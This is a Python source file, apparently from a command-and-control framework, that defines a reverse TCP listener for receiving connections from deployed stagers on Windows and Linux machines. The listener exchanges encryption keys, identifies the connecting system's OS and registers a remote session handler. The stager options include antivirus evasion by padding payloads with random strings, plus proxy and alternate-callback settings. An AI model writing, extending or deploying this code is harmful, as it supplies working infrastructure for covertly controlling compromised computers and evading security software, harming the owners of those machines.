"""Reverse Socket TCP Listener"""
import socket
import ssl
import threading
import time
from typing import TYPE_CHECKING

from Creator.available import (AVAILABLE_ENCODINGS, AVAILABLE_FORMATS,
                               AVAILABLE_LISTENERS)
from cryptography.fernet import Fernet
from Database import ListenerModel, db_session
from Handlers.socket.reverse.tcp.linux import Linux
from Handlers.socket.reverse.tcp.windows import Windows
from Listeners.base import BaseListener
from Utils.options import (AddressType, BooleanType, ChoiceType, IntegerType,
                           Option, OptionPool, StringType, TableType)
from Utils.ui import log

if TYPE_CHECKING:
    from Commander import Commander


class Listener(BaseListener):
    """The Reverse Tcp Listener Class"""
    listener_pool = OptionPool([
        Option(
            name="Name",
            description="The name of the listener.",
            type=StringType,
            required=True,
        ),
        Option(
            name="Type",
            description="The Type of the listener.",
            type=ChoiceType(AVAILABLE_LISTENERS, str),
            required=True
        ),
        Option(
            name="Address",
            description="The address the listener should listen on.",
            type=AddressType,
            required=True,
            default="0.0.0.0"
        ),
        Option(
            name="Port",
            description="The port the listener should listen on.",
            type=IntegerType,
            required=True,
            default=9999
        ),
        Option(
            name="SSL",
            description="True if the listener should use ssl.",
            type=BooleanType,
            default=True
        ),
        Option(
            name="Connection limit",
            _real_name="limit",
            description="How many devices can be connected to one listener at once.",
            type=IntegerType,
            default=5
        )
    ])
    stager_pool = OptionPool([
        Option(
            name="Name",
            description="The name of the stager.",
            type=StringType,
            required=True,
        ),
        Option(
            name="Listener",
            description="The listener, the stager should connect to.",
            type=TableType(db_session.query(ListenerModel).all(), ListenerModel),
            required=True,
            default=1
        ),
        Option(
            name="Encoding",
            description="The encoding to use.",
            type=ChoiceType(AVAILABLE_ENCODINGS, "str"),
            default=AVAILABLE_ENCODINGS[0]
        ),
        Option(
            name="Random size",
            _real_name="random_size",
            description="Add random sized strings to the payload to bypass the AV.",
            type=BooleanType,
            default=False
        ),
        Option(
            name="Timeout",
            description="How often the stager should try to connect, before it will exit.",
            type=IntegerType,
            default=200
        ),
        Option(
            name="Format",
            description="The format of the stager.",
            type=ChoiceType(AVAILABLE_FORMATS, str),
            default=AVAILABLE_FORMATS[0]
        ),
        Option(
            name="Proxy address",
            _real_name="proxy_address",
            description="The address of a proxy to use.",
            type=AddressType,
        ),
        Option(
            name="Proxy port",
            _real_name="proxy_port",
            description="The port of a proxy to use.",
            type=IntegerType,
            default=8080
        ),
        Option(
            name="Proxy authentication",
            _real_name="proxy_auth",
            description="The Authentication to use (format=username:password).",
            type=StringType,
            default="username:password"
        ),
        Option(
            name="Different address/domain",
            _real_name="different-address",
            description="Use a different address/domain then specified by the listener to connect to.",
            type=AddressType,
            required=False
        )
    ])

    def __init__(self, commander: "Commander", db_entry: ListenerModel):
        super().__init__(commander, db_entry)

        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.settimeout(2)
        if self.ssl:
            self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            self.ssl_context.load_cert_chain(
                certfile="Data/ssl.pem", keyfile="Data/ssl.key")
            self.listener = self.ssl_context.wrap_socket(
                self.listener, server_side=True)
        self.listener_thread = threading.Thread(
            target=self.listen, name="Listener " + str(self.id))
        self.refresher_thread = threading.Thread(
            target=self.refresh_connections, name="Refresher " + str(self.id))

    def refresh_connections(self):
        while True:
            # Check if Server is stopped
            device_disconnected = False
            if self.stopped:
                break
            for device in self.handlers.values():
                if not device.alive():
                    self.remove_handler(device)
                    log(f"Connection to {device.addr}  has been lost. [ID : {device.id}]",
                        alert="critical")
                    break
            if not device_disconnected:
                time.sleep(10)

    def listen(self):
        while True:
            # Check if Server stopped
            if self.stopped:
                break
            try:
                # Accept the Connection
                connection, addr = self.listener.accept()
            except Exception:
                pass
            else:
                key = Fernet.generate_key()
                try:
                    connection.send(key)
                except socket.error:
                    continue
                try:
                    operating_system = self.decrypt(
                        connection.recv(1024), key).lower()
                except:
                    connection.close()
                    continue
                log(
                    f"New Connection established from {addr[0]}", alert="success")
                if operating_system == "windows":
                    # Create a Windows Object to store the connection
                    self.add_handler(
                        Windows(
                            connection,
                            addr[0],
                            key,
                            self.commander.active_handlers_count + 1))
                elif operating_system == "linux":
                    # Create a Linux Object to store the connection
                    self.add_handler(
                        Linux(
                            connection, addr[0],
                            key,
                            self.commander.active_handlers_count + 1))
                else:
                    log(f"Unknown Operating System: {operating_system}",
                        alert="error")
                    connection.close()
                    continue

    def start(self):
        try:
            self.listener.bind((self.address, self.port))
            self.listener.listen(self.db_entry.connection_limit)
        except socket.error as e:
            raise Exception(str(e).split("]")[1][1:]) from None
        # Start the Listener and Refresher
        self.stopped = False
        self.listener_thread.start()
        self.refresher_thread.start()

    def stop(self):
        self.stopped = True
